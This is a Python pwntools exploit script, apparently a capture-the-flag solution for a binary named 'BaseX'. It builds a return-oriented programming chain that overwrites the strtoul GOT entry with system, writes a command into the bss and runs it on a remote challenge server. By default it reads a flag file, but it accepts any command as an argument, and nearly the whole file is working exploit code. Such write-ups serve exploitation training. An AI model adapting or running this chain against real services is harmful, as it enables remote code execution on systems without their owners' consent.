#!/usr/bin/env python2

from pwn import *
from socket import SHUT_WR

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc.so.6')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('BaseX')
context.log_level = 'info'
context.os = 'linux'
context.bits = 64
context.arch = 'amd64'
context.endian = 'little'

###

digs = ''.join([chr(x) for x in xrange(48,79)])
def int2base(x, base):
    if x < 0:
        sign = -1
    elif x == 0:
        return digs[0]
    else:
        sign = 1

    x *= sign
    digits = []

    while x:
        digits.append(digs[int(x % base)])
        x = int(x / base)

    if sign < 0:
        digits.append('-')

    digits.reverse()

    return ''.join(digits)

if DEBUG:
    r = process('./BaseX')
else:
    r = remote('basex.challs.malice.fr', 4444)

GDB = False
if GDB and DEBUG:
    deb = '''
    b *0x0000000000400867
    '''
    gdb.attach(r, deb)

# gadgets
add = 0x00000000004005f8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
rbxrbp = 0x000000000040075f # pop rbx ; pop rbp ; ret
rdi = 0x00000000004008f3 # pop rdi ; ret

diff_system = libc.symbols['system'] - libc.symbols['strtoul']
if diff_system < 0:
    diff_system = (1<<32) + diff_system

# the ropchain will add the difference between got.strtoul and system
# then put the cmd inside the bss thanks to the add gadget
# then call system
cmd = 'cat /srv/flag.txt'
if len(sys.argv) >= 3:
    cmd = sys.argv[2]
idx = b.bss(0x50 + 0x3d)

# first, modify got.strtoul to system
ROP = [rbxrbp,
    diff_system,
    b.got['strtoul'] + 0x3d,
    add]
# then we add our command to the bss
for i in xrange(0, len(cmd), 4):
    ROP.append(rbxrbp)
    ROP.append(int(cmd[i:i+4][::-1].encode('hex'),16))
    ROP.append(idx)
    ROP.append(add)
    idx += 4
# then we call system
ROP.extend([rdi,
    b.bss(0x50),
    rbxrbp,
    0xdeadbeef, # rbx
    b.bss(0x100), # rbp needs sane value
    b.plt['strtoul']]
)

# writing the ROPChain on the stack
index = 517
for elem in ROP:
    r.send(str(int2base(elem, 31)).ljust(0x14, '\x00'))
    r.send(str(index << 32).ljust(0x14, '\x00'))
    r.send('\x00' * 0x14)
    r.send('\x00' * 0x14)
    index += 1

# trigger exploit
if DEBUG:
    r.stdin.close()
else:
    r.sock.shutdown(SHUT_WR)

d = r.recvall(timeout=2)
print d.rstrip()

r.close()

# NDH{!s0m3t1m35_R0Ps_4r3_n0t_BaseX!}
